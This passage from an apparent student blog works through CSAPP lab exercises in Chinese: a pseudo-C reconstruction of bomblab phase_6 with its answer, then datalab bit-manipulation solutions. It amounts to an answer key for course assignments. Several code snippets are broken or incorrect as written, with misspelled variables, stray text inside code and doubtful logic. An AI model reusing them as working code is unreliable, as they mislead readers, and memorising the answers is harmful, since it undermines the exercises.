class="comment">///////////////////////////////////////////////////////////用7减去满足条件的数存放在以rsp为首的位置（rsp~rsp+0x14）</span></span><br><span class="line">				rsi = <span class="number">0</span>;<span class="comment">//mov    esi,0x0                     将esi置零，用作计数器</span></span><br><span class="line">				<span class="keyword">goto</span> jump401197;</span><br><span class="line">	jump401197: ecx = *(rsp + rsi);<span class="comment">//mov  ecx,DWORD PTR [rsp+rsi*1]     （第一次）ecx=input1</span></span><br><span class="line">				<span class="keyword">if</span> (ecx &lt;= <span class="number">1</span>)<span class="comment">//cmp  ecx,0x1  7-6=1                只可能是输入为6的情况啊   </span></span><br><span class="line">				&#123;</span><br><span class="line">					edx = <span class="number">0x6032d0</span>;<span class="comment">//	mov    edx,0x6032d0</span></span><br><span class="line">					<span class="keyword">goto</span> jump401188;<span class="comment">////jle   401183 &lt;phase_6+0x8f&gt;     输入为6进行跳转</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>            <span class="comment">//输入5 4 3 2 1 0 的情况      （假设input=2即输入为5）</span></span><br><span class="line">				&#123;</span><br><span class="line">					eax = <span class="number">1</span>;<span class="comment">//mov    eax,0x1                       </span></span><br><span class="line">					edx = <span class="number">0x6032d0</span>;<span class="comment">//mov    edx,0x6032d0</span></span><br><span class="line">					<span class="keyword">goto</span> jump401176;</span><br><span class="line">				jump401176:</span><br><span class="line">					edx = edx + <span class="number">0x8</span>;<span class="comment">//	mov  rdx,QWORD PTR [rdx+0x8]   0x6032d8处的内容  </span></span><br><span class="line">					eax = eax + <span class="number">1</span>;<span class="comment">//add    eax,0x1             此时的input1为2（加1次8）   input为5（加4次8）</span></span><br><span class="line">					<span class="keyword">if</span> (eax != ecx)<span class="comment">//cmp eax,ecx        </span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">goto</span> jump401176;<span class="comment">//jne 401176 &lt;phase_6+0x82&gt;</span></span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="comment">//	jmp    401188 &lt;phase_6+0x94&gt;</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">goto</span> jump401188;</span><br><span class="line">					jump401188:</span><br><span class="line">						rsp = edx;<span class="comment">//mov    QWORD PTR [rsp+rsi*2+0x20],rdx      将rdx（0x6032d8）的数据存入 rsp+0+0x20处    </span></span><br><span class="line">						rsi = rsi + <span class="number">4</span>;<span class="comment">//add    rsi,0x4                4 8</span></span><br><span class="line">						<span class="keyword">if</span> (rsi == <span class="number">0x18</span>)<span class="comment">//je  4011ab &lt;phase_6+0xb7&gt;    循环6次 第一次到这里是4 第六次是0x18</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="comment">/////////////////////////////////////////将6个数据分类讨论后进入（第三次筛选）</span></span><br><span class="line">							<span class="keyword">goto</span> jump4011ab;</span><br><span class="line">						jump4011ab:</span><br><span class="line">							ebx = rsp+<span class="number">0x20</span>;<span class="comment">//ebx=    mov    rbx,QWORD PTR [rsp+0x20]        将fake 1载入ebx</span></span><br><span class="line">							eax = rsp+<span class="number">0x28</span>;<span class="comment">//rax= 	lea    rax,[rsp+0x28]                   将fake 2的地址载入rax</span></span><br><span class="line">							rsi = rsp+<span class="number">0x50</span>;<span class="comment">//rsi=  lea    rsi,[rsp+0x50]                    将结束地址载入rsi</span></span><br><span class="line">							ecx = ebx;<span class="comment">//	mov    rcx,rbx                                  将fake 1载入rcx</span></span><br><span class="line">		jump4011bd:			edx = eax; <span class="comment">//mov    rdx, QWORD PTR[rax]                         将fake x值载入rdx x=2 3 4 5 6</span></span><br><span class="line">							ecx = edx;<span class="comment">//	mov    QWORD PTR [rcx+0x8],rdx                  将rdx   值载入fake y+8的位置 y=1 2 3 4 5</span></span><br><span class="line">							eax = eax + <span class="number">8</span>;                                               <span class="comment">// eax指向下一个fake </span></span><br><span class="line">							<span class="keyword">if</span> (eax == rsi)                                     </span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">goto</span> jump4011d2;</span><br><span class="line">							jump4011d2:</span><br><span class="line">								edx = <span class="number">0</span>;<span class="comment">//mov    QWORD PTR [rdx+0x8],0x0          （第一轮）将0载入fake 6 的位置</span></span><br><span class="line">								ebp = <span class="number">5</span>;<span class="comment">//mov    ebp,0x5                           计数器</span></span><br><span class="line">	      jump4011df:			eax=ebx;<span class="comment">//mov    rax,QWORD PTR [rbx+0x8]           将（fake y）载入rax x=2 3 4 5 6</span></span><br><span class="line">								eax = eax;<span class="comment">//mov    eax,DWORD PTR [rax]              </span></span><br><span class="line">								ebx = eax;<span class="comment">//cmp    DWORD PTR[rbx], eax              </span></span><br><span class="line">								<span class="keyword">if</span> (ebx &gt;= eax)<span class="comment">//jge    4011ee &lt;phase_6+0xfa&gt;</span></span><br><span class="line">								&#123;</span><br><span class="line">									<span class="keyword">goto</span> jump4011ee;</span><br><span class="line">								jump4011ee:</span><br><span class="line">									<span class="comment">//mov    rbx,QWORD PTR [rbx+0x8]      将fake2载入rbx</span></span><br><span class="line">									ebp = ebp - <span class="number">1</span>;<span class="comment">//sub    ebp,0x1</span></span><br><span class="line">									<span class="keyword">if</span> (ebp != <span class="number">1</span>)    <span class="comment">// 满足最后一轮循环后即可乱杀</span></span><br><span class="line">									&#123;</span><br><span class="line">										<span class="keyword">goto</span> jump4011df;</span><br><span class="line">									&#125;</span><br><span class="line">									<span class="keyword">else</span></span><br><span class="line">									&#123;</span><br><span class="line">										<span class="built_in">printf</span>(<span class="string">&quot;w1n!!!_y0u_@r3_my_her0!!!!&quot;</span>);</span><br><span class="line">										<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">									&#125;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span>                <span class="comment">//如果小于则爆炸</span></span><br><span class="line">								&#123;</span><br><span class="line">									<span class="keyword">goto</span> bomb;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="comment">//mov    rcx,rdx</span></span><br><span class="line">								<span class="keyword">goto</span> jump4011bd;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							ecx = rsp + <span class="number">4</span>;<span class="comment">//mov ecx, DWORD PTR[rsp + rsi * 1]       （第一次）把第二个输入传给ecx   第三个</span></span><br><span class="line">							<span class="keyword">if</span> (ecx &lt;= <span class="number">1</span>)<span class="comment">//jle    401183 &lt;phase_6+0x8f&gt;     （查看第二个输入）（原为6）</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="comment">//mov    edx,0x6032d0</span></span><br><span class="line">								<span class="keyword">goto</span> jump401188;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> </span><br><span class="line">							&#123;</span><br><span class="line">								eax = <span class="number">1</span>;<span class="comment">//mov    eax,0x1</span></span><br><span class="line">								edx = <span class="number">0x6032d0</span>;<span class="comment">//mov    edx,0x6032d0</span></span><br><span class="line">								<span class="keyword">goto</span> jump401176;</span><br><span class="line">							<span class="comment">////////////////////////////////jump401176:</span></span><br><span class="line">							<span class="comment">////////////////////////////////	//mov    rdx,QWORD PTR [rdx+0x8]</span></span><br><span class="line">							<span class="comment">////////////////////////////////	//add    eax,0x1</span></span><br><span class="line">							<span class="comment">////////////////////////////////	if (eax == ecx)</span></span><br><span class="line">							<span class="comment">////////////////////////////////	&#123;</span></span><br><span class="line">							<span class="comment">////////////////////////////////		goto jump401188;</span></span><br><span class="line">							<span class="comment">////////////////////////////////	&#125;</span></span><br><span class="line">							<span class="comment">////////////////////////////////	else</span></span><br><span class="line">							<span class="comment">////////////////////////////////	&#123;</span></span><br><span class="line">							<span class="comment">////////////////////////////////		goto jump401176;</span></span><br><span class="line">							<span class="comment">////////////////////////////////	&#125;</span></span><br><span class="line"></span><br><span class="line">							&#125;</span><br><span class="line"></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">goto</span> jump401160;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			ebx = r12d;<span class="comment">//mov    ebx,r12d     （第一次）ebx=1   （第二次）r12d=2</span></span><br><span class="line"> jump401135:eax = ebx;<span class="comment">//movsxd rax,ebx        （第一次）eax=1 （第一个输入4次小循环）  (第二次) eax=2</span></span><br><span class="line">			eax = *(rsp + eax);<span class="comment">//mov    eax,DWORD PTR [rsp+rax*4] （第一次）eax=第二个输入   (第二次第3个输入)</span></span><br><span class="line">			<span class="keyword">if</span> (*(rbp) == eax)         <span class="comment">//（第一次路过）如果输入1、2相等   （第二次）如果2、3相等</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;401140 bomb!!!&quot;</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span><span class="comment">//jne    401145 &lt;phase_6+0x51&gt;</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">goto</span> jump401145;</span><br><span class="line">				jump401145:</span><br><span class="line">				ebx = ebx + <span class="number">1</span>;<span class="comment">//add    ebx,0x1     （第一次路过）ebx=2  （第二次路过）ebx=3 （第三次）ebx=4 （第四次）ebx=5</span></span><br><span class="line">				<span class="keyword">if</span> (ebx &lt;= <span class="number">5</span>)<span class="comment">//jle    401135 &lt;phase_6+0x41&gt; 很明显循环4次  这里针对的是前四个输入 </span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">goto</span> jump401135;  <span class="comment">//（）</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					r13 = r13 + <span class="number">1</span>;<span class="comment">//add    r13,0x4</span></span><br><span class="line">					<span class="keyword">goto</span> jump401114;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bomb!&quot;</span>);</span><br><span class="line">	    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, *r13 );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">bomb:<span class="built_in">printf</span>(<span class="string">&quot;bomb!!!!!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一题做的非常的。。。。。。。。怎么说呢，做完了看看别人的解题思路才发现这是个链表，我是直接把汇编还原成c语言，不是完全的还原，只是看着像的那种还原，这样做有一个好处是比直接看汇编简单一点，因为那个跳来跳去的，这样跳转到哪里，跳转条件至少清楚一点。第一层：检测六个数是否都小于等于6，第二层：用7减去原数据放在原始位置上，第三层：将0x6032d0处数据每隔8字节分别复制到栈中，这个复制顺序和我们的输入有关，比如说我们第一个输入是6，7-6&#x3D;1，就是将0x6032d0+0*8处的数据复制到第一个位置，第二个输入是3，7-3&#x3D;4，那么将0x6032d0+3*8处的数据复制到第二个位置。第四层：将复制到栈中的数据进行比较，大的在前。查看内存</p>
<p><img src="/2023/06/02/bomblab/QQ%E6%88%AA%E5%9B%BE20230505155410.png"></p>
<p>后面是序号，前面是数据，从大到小排列是345612，这个顺序是被7减过后的，所以原来的是432165</p>
<p>这种做法算是比较粗野的一种，说一下这次做题中遇到的问题，首先是【】的问题，现在在知道了，出现[]一般是要访问内存了，其二注意数据的长度，有dw，qw，b啥的。还有，有时候看不懂的时候就带入具体的数据看一看，比如说第三层那里，看不懂它是将哪里的数据复制到哪里，最后带入654321这样的具体数据一眼就看出了它是如何操作的。</p>
<p><img src="/2023/06/02/bomblab/QQ%E6%88%AA%E5%9B%BE20230505134616.png"></p>
]]></content>
  </entry>
  <entry>
    <title>csapp.lab</title>
    <url>/2023/03/24/csapp-lab/</url>
    <content><![CDATA[<h1 id="1-datalab-handout"><a href="#1-datalab-handout" class="headerlink" title="1.datalab-handout"></a>1.datalab-handout</h1><h3 id="测试命令"><a href="#测试命令" class="headerlink" title="测试命令"></a>测试命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make clean//每次更改都要重新编译</span><br><span class="line">make btest//进行测试</span><br><span class="line">./btest -g//以紧凑形式进行测试</span><br><span class="line">./dlc -e bits.c//检测是否符合编码准则</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://blog.csdn.net/FlamelNW/article/details/123039299">https://blog.csdn.net/FlamelNW/article/details/123039299</a></li>
<li></li>
</ul>
<h2 id="int"><a href="#int" class="headerlink" title="int"></a>int</h2><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>x^y using only ~ and &amp;,用按位运算~和&amp;实现异或。</p>
<p>&amp;是1、1的时候返回1，^是0、1的时候返回1,就拿4和5举例子吧</p>
<p>4：0100  0100 1011 1010 0101 1011</p>
<p>5：0101  0100 1010 1010 0101 1011</p>
<p>x、y是未知的，所以进行~运算的时候一定是对他两个同时。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="type">int</span> z=<span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> w=<span class="number">0</span>;</span><br><span class="line">  z=x&amp;y;<span class="comment">//0100</span></span><br><span class="line">  x=~x;<span class="comment">//1011</span></span><br><span class="line">  y=~y;<span class="comment">//1010</span></span><br><span class="line">  w=x&amp;y;<span class="comment">//1010</span></span><br><span class="line">  w=~w;<span class="comment">//0101</span></span><br><span class="line">  z=~z;<span class="comment">//1011</span></span><br><span class="line">  z=z&amp;w;<span class="comment">//0001</span></span><br><span class="line">  <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230312010752.png"></p>
<p>成功，其实很大程度是连蒙带猜的，毕竟就这两种运算。看看大佬是怎么分析的<img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230312011601.png"></p>
<p>思路：用(x&amp;y)定位出共同的1所在，用(<del>x&amp;</del>y)定位出共同的0所在，其余部位就是既有1又有0啦，然后非全0部位和非全1部位进行&amp;运算<del>(x&amp;y)&amp;</del>(<del>x&amp;</del>y)</p>
<h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>return minimum two’s complement integer，返回补码最小值。</p>
<p>对于一个正数，它的二进制形式就是它的原码，正数的原码补码反码相同。</p>
<p>对于一个负数，反码是将除符号位以外的位全部取反，补码就是将反码加上1。</p>
<p>对于-1</p>
<p>原码：1000 0001</p>
<p>反码：1111 1110</p>
<p>补码：1111 1111</p>
<p><img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230312202856.png"></p>
<p>补码最小值，及第32位为1，其余位为0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">   <span class="type">int</span> min =<span class="number">1</span>;</span><br><span class="line">   min=min&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>returns 1 if x is the maximum, two’s complement number,and 0 otherwise，传来的参数是补码的最大值则返回1，其余情况返回0。</p>
<p>从上图我们可以看到，补码的最大值紧挨着补码的最小值，所以我们只要将最小值减1即可，可是题目不允许使用移位操作符。</p>
<p>经过很长时间的思考，发现根本表示不出最大值，参考了一下，豁然开朗，可以假设传入的参数就是就是最大值。我们可以看出最大值有一个特性，那就是max+1&#x3D;<del>(max+1),也不能完全说是特性吧，因为-1也拥有这个属性，仅此两个。首先我们可以通过max^(</del>(max+1)),如果其值返回0那我们可以锁定-1和max这两种情况,接下来我们在排除其是-1这种情况。我们只要找出-1的特性即可，(-1+1)&amp;-1&#x3D;0,其他的任何数都满足不了这一点。这种做法可以实现函数功能，却没有满足操作符的数量，使用了11个操作符，题目规定不能大于10。参考过后修改一下操作数变成9啦。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">isMax</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//如果是max则返回1，其余返回0</span></span><br><span class="line">&#123; <span class="comment">//int a=((x+1)&amp;~0);//如果x等于-1则返回0，其余的所有数都是非零</span></span><br><span class="line">  <span class="type">int</span> a=x+<span class="number">1</span>;<span class="comment">//这样也能判断是否为-1</span></span><br><span class="line">  <span class="type">int</span> b=(x^(~(x+<span class="number">1</span>)));<span class="comment">//如果是max或—1则返回0，其余的会返回非0</span></span><br><span class="line">  <span class="type">int</span> c=!!(!a)^(!b);！！可以使非零值返回<span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考一下<img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230313005141.png"></p>
<h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>return 1 if all odd-numbered bits in word set to 1，如果所有的奇数位都为1则返回1，最左侧为第31位，最右侧为第0位。</p>
<p>我们可以看看奇数位为1的数有什么共同点。<img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230313201116.png"></p>
<p>额，这我只能说是毫无头绪好吧。奇数位必须为1，偶数位不做要求。灵光一现：左移偶数位，得到的数一定是负数。然而并没有什么卵用。直接选择参考。data&#x3D;1010 1010(32位)，参数x^data,如果x满足要求，则返回data。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//题目要求可以使用的最大的数为0xff即1010 1010 我们要通过移位操作构造出32位奇数位全为1的data</span></span><br><span class="line"><span class="type">int</span> a=<span class="number">0xAA</span>;<span class="comment">//1010 1010</span></span><br><span class="line"><span class="type">int</span> a2=a&lt;&lt;<span class="number">8</span>|a;<span class="comment">//1010 1010 x 2</span></span><br><span class="line"><span class="type">int</span> data=((a2&lt;&lt;<span class="number">16</span>)|a2);<span class="comment">//1010 1010 x 4 32位</span></span><br><span class="line"><span class="type">int</span> mid=x&amp;data;<span class="comment">//x的偶数位全部变成0，奇数位是1则1，是0则0,即如果x奇数位全部为1则返回data</span></span><br><span class="line"><span class="type">int</span> final=mid^data；<span class="comment">//如果x为符合，则mid==data，则异或结果为0</span></span><br><span class="line"><span class="keyword">return</span> !final;<span class="comment">//final为0则符合，题目让返回1    </span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>可以这么说，这题要是不看点提示，想一天也想不来。还是按位操作这里有所欠缺。</p>
<h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>return -x ，返回-x。即返回一个数的相反数</p>
<p>这题比较简单，我们直接看一个数和他的相反数在二进制形式上有什么异同点。可以看出，只要按位取反再加上1即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//0000 0001   1</span></span><br><span class="line"><span class="comment">//1111 1111  -1</span></span><br><span class="line"><span class="comment">//0000 0010   2</span></span><br><span class="line"><span class="comment">//1111 1110  -2</span></span><br><span class="line"><span class="comment">//0111 1111   127</span></span><br><span class="line"><span class="comment">//1000 0001  -127</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (~x)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>return 1 if 0x30 &lt;&#x3D; x &lt;&#x3D; 0x39 (ASCII codes for characters ‘0’ to ‘9’)，如果传来的参数是数字则反回1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment">//0x30  0011 0000</span></span><br><span class="line"><span class="comment">//0x31  0011 0001</span></span><br><span class="line"><span class="comment">//……</span></span><br><span class="line"><span class="comment">//0x39  0011 1001</span></span><br><span class="line"><span class="type">int</span> a=(x&gt;&gt;<span class="number">4</span>)^<span class="number">3</span>(<span class="number">0011b</span>);<span class="comment">//若a为0，则说明前28位相同，我们只用再判断后四位即可,若不同则返回值非零</span></span><br><span class="line"><span class="type">int</span> b=(x&gt;&gt;<span class="number">4</span>)^(x+((~<span class="number">10</span>)+<span class="number">1</span>)&gt;&gt;<span class="number">4</span>);<span class="comment">//后四位如果是0~9则返回非零，如果不是则返回0</span></span><br><span class="line"><span class="keyword">return</span> !(a|(!b));<span class="comment">//如果前28位相同，且后四位小于10则返回1</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>解释一下最后一行，假设x是数字，则a&#x3D;0，b≠0，c&#x3D;!b&#x3D;0，所以a|(!b)&#x3D;0，反之a|(!b)≠0，所以在前面加上一个！。</p>
<h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>same as x ? y : z   如果x非零则返回y如果x为零则返回z。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=!!x;<span class="comment">//如果x为零则返回0，如果x非零则返回1</span></span><br><span class="line"><span class="type">int</span> b=(~a)+<span class="number">1</span>;<span class="comment">//如果a=0则返回0(全0)，如果a＝1则返回—1(全1)</span></span><br><span class="line"><span class="keyword">return</span> ((b&amp;y)+((~b)&amp;z));<span class="comment">//如果x为零则b为零，则返回z，反之返回y</span></span><br><span class="line"><span class="comment">//最后的return 也可以写成这样：return (b&amp;y)|((~b)&amp;z)</span></span><br></pre></td></tr></table></figure>

<h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>if x &lt;&#x3D; y  then return 1, else return 0  如果x&lt;&#x3D;y,返回1，反之返回0</p>
<p>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=x+((~y)+<span class="number">1</span>);<span class="comment">//a=x-y,如果a&lt;0，则a的最高位为1，如果a&gt;=0,最高位时0，这样有点不好实现，因为小于和等于没在一起</span></span><br><span class="line"><span class="type">int</span> b=y+((~x)+<span class="number">1</span>);<span class="comment">//b=y-x,如果y&gt;=x,则b的最高位为0，反之b的最高位为1</span></span><br><span class="line"><span class="type">int</span> c=b&gt;&gt;<span class="number">31</span>;<span class="comment">//如果成立则返回全0，如果不成立则返回全1</span></span><br><span class="line"><span class="keyword">return</span> c+<span class="number">1</span>；</span><br></pre></td></tr></table></figure>

<p>本来以为简简单单大功告成，进行测试发现没分，cao,上面的方法只适合同符号比较。   y&gt;&#x3D;x等价于y-x&gt;&#x3D;0在数学是行得通的，可是在计算机中要考虑 溢出问题。也就是可能会出现一些比较诡异的情况：</p>
<p>当y&lt;0,x&gt;0时，可能出现y-x&gt;0的情况，比如1000 0000-0000 0001<img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230316233030.png"></p>
<p>可以看到，由于第一位的1变成了0，所以就变成了正数。</p>
<p>当y&gt;0,x&lt;0时，可能出现y-x&lt;0的情况，比如0000 0001-1000 0000<img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230316234033.png"></p>
<p>有什么是可以肯定的呢，符号不同时，正数肯定比负数大，符号相同时看差值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//我测真的烦</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> singX=(x&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;<span class="comment">//如果不&amp;1，负数情况下就会返回-1</span></span><br><span class="line">    <span class="type">int</span> signY=(y&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> signY_X=((y+(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;<span class="comment">//y-x如果大于等于则返回0，小于则返回1</span></span><br><span class="line">    <span class="type">int</span> checknSign=signX^signY;<span class="comment">//相同为0，不同为1</span></span><br><span class="line">    <span class="keyword">return</span> (!checkSign&amp;!signY_X)|(checkSign&amp;signX)</span><br><span class="line">&#125;          符号相同，看差的符号         符号不同时，x&lt;<span class="number">0</span>则返回<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这个return比较长，我们分开来看一下其实很简单，</p>
<p>左半部分：!checkSign&amp;!signY_X，符号相等的情况，符号相等不用考虑溢出的问题，我们可以直接根据差值的符号进行大小的判断，符号相等则check为0，signY_X如果满足则为0，否则为1，这里我们倒换一下，也就是满足时返回1，不满足时返回0，如果出现符号不相等，则左半部分返回0</p>
<p>右半部分：如果符号相同则右半部分返回0，如果符号不同，那么我们只需要看x的符号即可，如果x是负数，一定满足条件则返回他的符号1</p>
<p>反思：卡在这里很久很久，因为什么？？？一个很重要的原因对按位运算|掌握得不够熟悉，看到很多师傅的解前面有很多都使用了|，从这一题往后很难不用到|，不能再简单的使用加减。</p>
<h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>implement the ! operator, using all of   the legal operators except !</p>
<p> Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<p>使用其他合规操作符实现！，也就是传入的参数为0则返回1，非零则返回0</p>
<p>思路零：未完成</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//0   0000 0000     0的相反数是0 相反数和自身异或取其符号位，为零则为零，非零则为1</span></span><br><span class="line"><span class="comment">//正数 0000 1110</span></span><br><span class="line"><span class="comment">//负数 1000 0100</span></span><br><span class="line"><span class="comment">//0 异或0为0</span></span><br><span class="line">   <span class="type">int</span> signX=(X&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;<span class="comment">//获取x的符号，负数则为1</span></span><br><span class="line">   <span class="type">int</span> _signX=((~x+<span class="number">1</span>)&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;<span class="comment">//获取-x的符号</span></span><br><span class="line">   <span class="keyword">return</span> signX^_signX^<span class="number">1</span>;</span><br><span class="line">   <span class="comment">//零异或上自己的相反数为0，其他数为1，在异或上1，改变符号</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="type">int</span> xor0=(<span class="number">0</span>^x)&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;x为零和正数则为<span class="number">0</span>，负数返回<span class="number">1</span></span><br><span class="line">    <span class="comment">//我们需要这样一个数，等于零时返回1，其余时候返回0 死循环</span></span><br></pre></td></tr></table></figure>

<p>运行失败，看以下错误原因</p>
<p><img src="/2023/03/24/csapp-lab/QQ%E6%88%AA%E5%9B%BE20230323155705.png"></p>
<p>0x80000也就是最小数10000000这里出现了错误，我们知道对于有符号整型，负数范围比正数大一，所以表示不出来最小数的相反数，这个数和零一样，相反数等于自身。收到一位师傅的启发，我们可以给符号位取反，这样0x80000的符号位就变成0，不造成影响</p>
<p>思路一：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> _x=~x+<span class="number">1</span>;</span><br><span class="line">   <span class="type">int</span> sign=(((~x&amp;~_x))&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> sign;</span><br><span class="line">   取反后非零数相反数进行&amp;运算符号位为<span class="number">0</span>，如果不进行取反操作则不能绕过<span class="number">0x8000</span>这个存在，它的相反数和自身符号相同都为<span class="number">1</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>思路二：</p>
<p>一个非零数或上自己的相反数其符号位总是1，最小值0x8000也不例外，虽然它的相反数无法表示，但其最高位都是1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sign=(x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>;如果是零则返回<span class="number">0000</span>，非零则返回<span class="number">1111</span></span><br><span class="line">    <span class="keyword">return</span> sign+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>都是用到相反数，只是如果使用异或的话不可行，因为0和min的相反数最高位相同，所以只能考虑使用|或&amp;。</p>
